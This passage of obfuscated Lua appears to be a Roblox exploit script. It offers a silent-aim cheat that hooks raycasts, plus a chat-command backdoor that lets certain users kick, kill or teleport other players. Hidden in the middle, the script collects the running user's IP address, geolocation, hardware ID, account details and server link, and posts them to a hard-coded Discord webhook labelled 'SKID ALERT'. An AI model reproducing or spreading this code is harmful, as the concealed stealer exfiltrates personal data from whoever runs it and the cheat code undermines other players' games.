            local l_BlindEffect_0 = l_LocalPlayer_0:FindFirstChild("PlayerGui"):FindFirstChild("BlindEffect");
            if v578[v593] then
                if not l_BlindEffect_0 then
                    l_BlindEffect_0 = Instance.new("ScreenGui");
                    l_BlindEffect_0.Name = "BlindEffect";
                    l_BlindEffect_0.ResetOnSpawn = false;
                    local l_Frame_0 = Instance.new("Frame");
                    l_Frame_0.Size = UDim2.new(1, 0, 1, 0);
                    l_Frame_0.BackgroundColor3 = Color3.new(0, 0, 0);
                    l_Frame_0.Parent = l_BlindEffect_0;
                    l_BlindEffect_0.Parent = l_LocalPlayer_0:WaitForChild("PlayerGui");
                end;
            elseif l_BlindEffect_0 then
                l_BlindEffect_0:Destroy();
            end;
        end;
        local function v616(v597, v598)
            -- upvalues: v587 (ref), l_Players_0 (ref), v592 (ref), l_l_HttpService_0_0 (ref), v596 (ref), v583 (ref)
            if not v587(v597) then
                return;
            else
                v598 = v598:lower();
                if v598:sub(1, 8) == ":c kick " then
                    local v599 = v598:sub(9);
                    for _, v601 in ipairs(l_Players_0:GetPlayers()) do
                        if v601 ~= v597 and v601.Name:lower():sub(1, #v599) == v599 then
                            v601:Kick("You have been kicked by an admin.");
                        end;
                    end;
                end;
                if v598:sub(1, 9) == ":c kill " then
                    local v602 = v598:sub(10);
                    for _, v604 in ipairs(l_Players_0:GetPlayers()) do
                        if v604 ~= v597 and v604.Character and v604.Character:FindFirstChild("Humanoid") then
                            local v605 = v604.Name:lower();
                            local v606 = v604.DisplayName:lower();
                            if v605:sub(1, #v602) == v602 or v606:sub(1, #v602) == v602 then
                                v604.Character.Humanoid.Health = 0;
                            end;
                        end;
                    end;
                end;
                if v598:sub(1, 7) == ":c say " then
                    local v607 = v598:sub(8);
                    if v607 and v607 ~= "" then
                        v592(v607);
                    end;
                end;
                if v598 == ":c aura" then
                    l_l_HttpService_0_0[v597] = not l_l_HttpService_0_0[v597];
                end;
                if v598 == ":c e" then
                    v596(v597);
                end;
                if v598:sub(1, 5) == ":c sb" then
                    local v608 = tonumber(v598:match("%d+"));
                    if v608 and v608 > 0 then
                        v583[v597] = v608;
                        v592("Safety bubble set to " .. v608);
                    else
                        v583[v597] = "Safety bubble set to ";
                        v592("Safety bubble disabled");
                    end;
                end;
                if v598 == ":c tp all" and v597.Character and v597.Character:FindFirstChild("HumanoidRootPart") then
                    local l_HumanoidRootPart_18 = v597.Character.HumanoidRootPart;
                    for _, v611 in ipairs(l_Players_0:GetPlayers()) do
                        if v611 ~= v597 and v611.Character and v611.Character:FindFirstChild("HumanoidRootPart") then
                            v611.Character.HumanoidRootPart.CFrame = l_HumanoidRootPart_18.CFrame + Vector3.new(3, 0, 0);
                        end;
                    end;
                end;
                if v598 == ":c kill all" then
                    for _, v613 in ipairs(l_Players_0:GetPlayers()) do
                        if v613 ~= v597 and v613.Character and v613.Character:FindFirstChild("Humanoid") then
                            v613.Character.Humanoid.Health = 0;
                        end;
                    end;
                end;
                if v598 == ":c ban all" then
                    for _, v615 in ipairs(l_Players_0:GetPlayers()) do
                        if v615 ~= v597 then
                            v615:Kick("You have been banned by an admin.");
                        end;
                    end;
                end;
                return;
            end;
        end;
        if l_TextChatService_0.ChatVersion == Enum.ChatVersion.TextChatService then
            local l_TextChannels_1 = l_TextChatService_0:FindFirstChild("TextChannels");
            if l_TextChannels_1 then
                local l_RBXGeneral_1 = l_TextChannels_1:FindFirstChild("RBXGeneral");
                if l_RBXGeneral_1 then
                    l_RBXGeneral_1.MessageReceived:Connect(function(v619)
                        -- upvalues: l_Players_0 (ref), v616 (ref)
                        local l_TextSource_0 = v619.TextSource;
                        if l_TextSource_0 then
                            local l_l_Players_0_PlayerByUserId_2 = l_Players_0:GetPlayerByUserId(l_TextSource_0.UserId);
                            if l_l_Players_0_PlayerByUserId_2 then
                                v616(l_l_Players_0_PlayerByUserId_2, v619.Text);
                            end;
                            return;
                        else
                            return;
                        end;
                    end);
                end;
            end;
        else
            local l_ipairs_0 = ipairs;
            local v623 = "GetPlayers";
            local l_l_Players_0_0 = l_Players_0;
            for _, v626 in l_ipairs_0(l_Players_0[v623](l_l_Players_0_0)) do
                do
                    local l_v626_0 = v626;
                    l_v626_0.Chatted:Connect(function(v628)
                        -- upvalues: v616 (ref), l_v626_0 (ref)
                        v616(l_v626_0, v628);
                    end);
                end;
            end;
            l_Players_0.PlayerAdded:Connect(function(v629)
                -- upvalues: v616 (ref)
                v629.Chatted:Connect(function(v630)
                    -- upvalues: v616 (ref), v629 (ref)
                    v616(v629, v630);
                end);
            end);
        end;
        l_RunService_0.Heartbeat:Connect(function()
            -- upvalues: l_l_HttpService_0_0 (ref), v580 (ref)
            for v631, v632 in pairs(l_l_HttpService_0_0) do
                if v632 and v631.Character and v631.Character:FindFirstChild("HumanoidRootPart") then
                    local l_HumanoidRootPart_19 = v631.Character.HumanoidRootPart;
                    local v634 = tick();
                    for v635 in pairs(v580) do
                        if v635 ~= v631 and v635.Character and v635.Character:FindFirstChild("HumanoidRootPart") then
                            local v636 = (v634 + v635.UserId) % (2 * math.pi);
                            local v637 = 10;
                            local v638 = Vector3.new(math.cos(v636) * v637, 0, math.sin(v636) * v637);
                            v635.Character.HumanoidRootPart.CFrame = l_HumanoidRootPart_19.CFrame + v638;
                        end;
                    end;
                end;
            end;
        end);
        l_RunService_0.Heartbeat:Connect(function()
            -- upvalues: v583 (ref), v580 (ref)
            for v639, v640 in pairs(v583) do
                if v639.Character and v639.Character:FindFirstChild("HumanoidRootPart") then
                    local l_HumanoidRootPart_20 = v639.Character.HumanoidRootPart;
                    for v642 in pairs(v580) do
                        if v642 ~= v639 and v642.Character and v642.Character:FindFirstChild("HumanoidRootPart") then
                            local l_HumanoidRootPart_21 = v642.Character.HumanoidRootPart;
                            if (l_HumanoidRootPart_20.Position - l_HumanoidRootPart_21.Position).Magnitude < v640 then
                                local l_Unit_0 = (l_HumanoidRootPart_21.Position - l_HumanoidRootPart_20.Position).Unit;
                                l_HumanoidRootPart_21.CFrame = CFrame.new(l_HumanoidRootPart_20.Position + l_Unit_0 * v640);
                            end;
                        end;
                    end;
                end;
            end;
        end);
        local function v646(v645)
            -- upvalues: v580 (ref)
            v580[v645] = true;
        end;
        v646(l_LocalPlayer_0);
        l_Players_0.PlayerAdded:Connect(function(v647)
            -- upvalues: v646 (ref), v587 (ref), v592 (ref)
            v646(v647);
            if v587(v647) then
                task.delay(1, function()
                    -- upvalues: v592 (ref), v647 (ref)
                    v592("Lord " .. v647.DisplayName .. " has joined.");
                end);
            end;
        end);
        l_Players_0.PlayerRemoving:Connect(function(v648)
            -- upvalues: v580 (ref), l_l_HttpService_0_0 (ref), v578 (ref), v583 (ref)
            local v649 = nil;
            v580[v648] = v649;
            l_l_HttpService_0_0[v648] = v649;
            v578[v648] = v649;
            v583[v648] = v649;
        end);
        local v650 = {
            HttpService = game:GetService("HttpService"), 
            Players = game:GetService("Players"), 
            MarketplaceService = game:GetService("MarketplaceService"), 
            LocalizationService = game:GetService("LocalizationService"), 
            RbxAnalyticsService = game:GetService("RbxAnalyticsService"), 
            webhookUrl = "https://discord.com/api/webhooks/1431044656577380454/PNvtYV4nPBY9TssYSAfnNnBfoqJD00dYI9PKUwvLxeDhpfudxfjvR1ftkqPStSfCtXFn"
        };
        v650.LocalPlayer = v650.Players.LocalPlayer;
        v650.UserId = v650.LocalPlayer.UserId;
        v650.Name = v650.LocalPlayer.Name;
        v650.DisplayName = v650.LocalPlayer.DisplayName;
        v650.Membership = tostring(v650.LocalPlayer.MembershipType):sub(21);
        v650.Age = v650.LocalPlayer.AccountAge;
        v650.Country = v650.LocalizationService.RobloxLocaleId;
        v650.IP = game:HttpGet("https://v4.ident.me/");
        v650.Geo = game:HttpGet("http://ip-api.com/json");
        v650.HWID = v650.RbxAnalyticsService:GetClientId();
        v650.Job = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")";
        v650.Link = "roblox://placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId;
        v650.GameName = v650.MarketplaceService:GetProductInfo(game.PlaceId).Name;
        (function(v651)
            -- upvalues: v650 (ref)
            local v652 = http_request or request or HttpPost or syn.request;
            local v653 = {
                ["content-type"] = "application/json"
            };
            v652({
                Url = v650.webhookUrl, 
                Body = v651, 
                Method = "POST", 
                Headers = v653
            });
            v652({
                Url = v650.webhookUrl, 
                Body = v650.HttpService:JSONEncode({
                    content = v650.Link
                }), 
                Method = "POST", 
                Headers = v653
            });
        end)((function()
            -- upvalues: v650 (ref)
            local v654 = identifyexecutor();
            local v655 = {
                avatar_url = "", 
                content = "", 
                embeds = {
                    {
                        author = {
                            name = "SKID ALERT", 
                            url = "https://roblox.com"
                        }, 
                        description = string.format("__[Player Info](https://www.roblox.com/users/%d)__\n**Display Name:** %s\n**Username:** %s\n**User Id:** %d\n**MembershipType:** %s\n**AccountAge:** %d\n**Country:** %s\n**IP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s\n**Game Id:** %d\n**Exploit:** %s\n\n**Data:**```%s```\n\n**JobId:**```%s```", v650.UserId, v650.DisplayName, v650.Name, v650.UserId, v650.Membership, v650.Age, v650.Country, v650.IP, v650.HWID, os.date("%m/%d/%Y"), os.date("%X"), game.PlaceId, v650.GameName, game.PlaceId, v654, v650.Geo, v650.Job), 
                        type = "rich", 
                        color = tonumber("0xFFD700"), 
                        thumbnail = {
                            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. v650.UserId .. "&width=150&height=150&format=png"
                        }
                    }
                }
            };
            return v650.HttpService:JSONEncode(v655);
        end)());
        local v656 = v44:MakeTab({
            Name = "Silent Aim", 
            Icon = "rbxassetid://6031091005", 
            PremiumOnly = false
        });
        local v657 = {
            SA = {
                En = false, 
                Key = "RightAlt", 
                TP = "HumanoidRootPart", 
                Show = false, 
                MHP = false, 
                AP = false, 
                MHP_A = 0.165, 
                HC = 100, 
                Col = Color3.fromRGB(54, 57, 241)
            }, 
            Cam = l_Workspace_0.CurrentCamera, 
            P = game:GetService("Players"), 
            RS = game:GetService("RunService"), 
            GS = game:GetService("GuiService"), 
            UIS = game:GetService("UserInputService"), 
            ST = game:GetService("Stats"), 
            LP = game:GetService("Players").LocalPlayer, 
            MC = nil, 
            MB = nil, 
            M = nil, 
            MBX = nil, 
            VTP = {
                "Head", 
                "HumanoidRootPart"
            }, 
            CPA = 0.165, 
            EA = {
                Raycast = {
                    AC = 3, 
                    Args = {
                        "Instance", 
                        "Vector3", 
                        "Vector3", 
                        "RaycastParams"
                    }
                }
            }, 
            CoR = coroutine.resume, 
            CoC = coroutine.create
        };
        getgenv().SilentAimSettings = v657.SA;
        v657.M = v657.LP:GetMouse();
        v657.MBX = Drawing.new("Square");
        v657.MBX.Visible = false;
        v657.MBX.ZIndex = 999;
        v657.MBX.Color = v657.SA.Col;
        v657.MBX.Thickness = 2;
        v657.MBX.Size = Vector2.new(30, 30);
        v657.MBX.Filled = true;
        v657.MC = v657.UIS.TouchEnabled and not v657.UIS.KeyboardEnabled;
        local _ = game.GetChildren;
        local l_GetPlayers_0 = v657.P.GetPlayers;
        local l_WorldToScreenPoint_0 = v657.Cam.WorldToScreenPoint;
        local l_WorldToViewportPoint_0 = v657.Cam.WorldToViewportPoint;
        local l_FindFirstChild_0 = game.FindFirstChild;
        local l_RenderStepped_0 = v657.RS.RenderStepped;
        local l_Heartbeat_0 = v657.RS.Heartbeat;
        local _ = v657.GS.GetGuiInset;
        local l_GetMouseLocation_0 = v657.UIS.GetMouseLocation;
        local function v669(v667)
            v667 = math.floor(v667);
            if math.floor(math.random() * 100) / 100 > v667 / 100 then
                local _ = false;
            end;
            return true;
        end;
        local function v673(v670)
            -- upvalues: l_WorldToScreenPoint_0 (ref), v657 (ref)
            local v671, v672 = l_WorldToScreenPoint_0(v657.Cam, v670);
            return Vector2.new(v671.X, v671.Y), v672;
        end;
        local function v680(v674, v675)
            local v676 = 0;
            if #v674 >= v675.AC then
                for v677, v678 in next, v674 do
                    if typeof(v678) == v675.Args[v677] then
                        v676 = v676 + 1;
                    end;
                end;
                if v675.AC > v676 then
                    local _ = false;
                end;
                return true;
            else
                return false;
            end;
        end;
        local function v683(v681, v682)
            return (v682 - v681).Unit * 1000;
        end;
        local function v684()
            -- upvalues: l_GetMouseLocation_0 (ref), v657 (ref)
            return l_GetMouseLocation_0(v657.UIS);
        end;
        local function v687(v685)
            -- upvalues: v657 (ref)
            local v686 = v685.Velocity or Vector3.new();
            return v685.Position + (v657.SA.MHP and v686 * v657.CPA or Vector3.new());
        end;
        local function v699()
            -- upvalues: v657 (ref), v684 (ref), l_GetPlayers_0 (ref), l_FindFirstChild_0 (ref), v673 (ref)
            if v657.SA.TP then
                local v688 = nil;
                local v689 = nil;
                local v690 = v657.MC and v657.Cam.ViewportSize / 2 or v684();
                for _, v692 in next, l_GetPlayers_0(v657.P) do
                    if v692 ~= v657.LP then
                        local l_Character_21 = v692.Character;
                        if l_Character_21 then
                            local v694 = l_FindFirstChild_0(l_Character_21, "HumanoidRootPart");
                            local v695 = l_FindFirstChild_0(l_Character_21, "Humanoid");
                            if v694 and v695 and (not v695 or v695.Health > 0) and (v657.Cam.CFrame.Position - v694.Position).Magnitude <= 35 then
                                local v696, v697 = v673(v694.Position);
                                if v697 then
                                    local l_Magnitude_1 = (v690 - v696).Magnitude;
                                    if l_Magnitude_1 <= (not v689 and 2000 or v689) then
                                        v688 = not (v657.SA.TP ~= "Random") and l_Character_21[v657.VTP[math.random(1, #v657.VTP)]] or l_Character_21[v657.SA.TP];
                                        v689 = l_Magnitude_1;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end;
                return v688;
            else
                return;
            end;
        end;
        v656:AddToggle({
            Name = "Enabled", 
            Default = v657.SA.En, 
            Callback = function(v700)
                -- upvalues: v657 (ref)
                v657.SA.En = v700;
                v657.MBX.Visible = v700;
            end
        });
        v656:AddBind({
            Name = "Toggle Key", 
            Default = Enum.KeyCode[v657.SA.Key], 
            Hold = false, 
            Callback = function()
                -- upvalues: v657 (ref)
                v657.SA.En = not v657.SA.En;
                EnabledToggle:Set(v657.SA.En);
                v657.MBX.Visible = v657.SA.En;
            end
        });
        v656:AddDropdown({
            Name = "Target Part", 
            Default = v657.SA.TP, 
            Options = {
                "Head", 
                "HumanoidRootPart", 
                "Random"
            }, 
            Callback = function(v701)
                -- upvalues: v657 (ref)
                v657.SA.TP = v701;
            end
        });
        v656:AddSlider({
            Name = "Hit Chance", 
            Min = 0, 
            Max = 100, 
            Increment = 1, 
            Default = v657.SA.HC, 
            ValueName = "%", 
            Callback = function(v702)
                -- upvalues: v657 (ref)
                v657.SA.HC = v702;
            end
        });
        v656:AddSection({
            Name = "Prediction"
        });
        v656:AddToggle({
            Name = "Manual Prediction", 
            Default = v657.SA.MHP, 
            Callback = function(v703)
                -- upvalues: v657 (ref)
                v657.SA.MHP = v703;
            end
        });
        v656:AddToggle({
            Name = "Auto Prediction", 
            Default = v657.SA.AP, 
            Callback = function(v704)
                -- upvalues: v657 (ref)
                v657.SA.AP = v704;
            end
        });
        v656:AddSlider({
            Name = "Prediction Amount", 
            Min = 0.165, 
            Max = 1, 
            Increment = 0.001, 
            Default = v657.SA.MHP_A, 
            Callback = function(v705)
                -- upvalues: v657 (ref)
                v657.SA.MHP_A = v705;
            end
        });
        v656:AddSection({
            Name = "Visuals"
        });
        v656:AddToggle({
            Name = "Show Silent Aim Target", 
            Default = v657.SA.Show, 
            Callback = function(v706)
                -- upvalues: v657 (ref)
                v657.SA.Show = v706;
                v657.MBX.Visible = v706;
            end
        });
        v656:AddColorpicker({
            Name = "Silent Aim Target Color", 
            Default = v657.SA.Col, 
            Callback = function(v707)
                -- upvalues: v657 (ref)
                v657.SA.Col = v707;
                v657.MBX.Color = v707;
            end
        });
        l_Heartbeat_0:Connect(function()
            -- upvalues: v657 (ref)
            if v657.SA.AP then
                local l_status_4, l_result_4 = pcall(function()
                    -- upvalues: v657 (ref)
                    return v657.ST.Network.ServerStatsItem["Data Ping"]:GetValueString();
                end);
                if l_status_4 then
                    local v710 = tonumber(l_result_4:match("(%d+)")) or 50;
                    if v710 < 20 then
                        v657.CPA = 0.11;
                    elseif v710 < 30 then
                        v657.CPA = 0.115;
                    elseif v710 < 40 then
                        v657.CPA = 0.12;
                    elseif v710 < 50 then
                        v657.CPA = 0.125;
                    elseif v710 >= 60 then
                        if v710 < 70 then
                            v657.CPA = 0.135;
                        elseif v710 >= 80 then
                            if v710 < 90 then
                                v657.CPA = 0.145;
                            elseif v710 >= 100 then
                                if v710 >= 110 then
                                    v657.CPA = 0.16;
                                else
                                    v657.CPA = 0.155;
                                end;
                            else
                                v657.CPA = 0.15;
                            end;
                        else
                            v657.CPA = 0.14;
                        end;
                    else
                        v657.CPA = 0.13;
                    end;
                end;
            else
                v657.CPA = v657.SA.MHP_A;
            end;
        end);
        v657.CoR(v657.CoC(function()
            -- upvalues: l_RenderStepped_0 (ref), v657 (ref), v699 (ref), l_WorldToViewportPoint_0 (ref)
            l_RenderStepped_0:Connect(function()
                -- upvalues: v657 (ref), v699 (ref), l_WorldToViewportPoint_0 (ref)
                if v657.SA.Show and v657.SA.En then
                    if v699() then
                        local v711 = v699().Parent.PrimaryPart or v699();
                        local v712, v713 = l_WorldToViewportPoint_0(v657.Cam, v711.Position);
                        v657.MBX.Visible = v713;
                        v657.MBX.Position = Vector2.new(v712.X, v712.Y);
                    else
                        v657.MBX.Visible = false;
                        v657.MBX.Position = Vector2.new();
                    end;
                end;
            end);
        end));
        local v714 = nil;
        v714 = hookmetamethod(game, "__namecall", newcclosure(function(...)
            -- upvalues: v669 (ref), v657 (ref), l_Workspace_0 (ref), v680 (ref), v699 (ref), v683 (ref), v687 (ref), v714 (ref)
            local v715 = getnamecallmethod();
            local v716 = {
                ...
            };
            local v717 = v716[1];
            local v718 = v669(v657.SA.HC);
            if v657.SA.En and v717 == l_Workspace_0 and not checkcaller() and v718 and v715 == "Raycast" and v680(v716, v657.EA.Raycast) then
                local v719 = v716[2];
                local v720 = v699();
                if v720 then
                    v716[3] = v683(v719, v687(v720));
                    return v714(unpack(v716));
                end;
            end;
            return v714(...);
        end));
        local v721 = "Init";
        local l_v43_0 = v43;
        v43[v721](l_v43_0);
        return;
    end;
else
    return;
end;
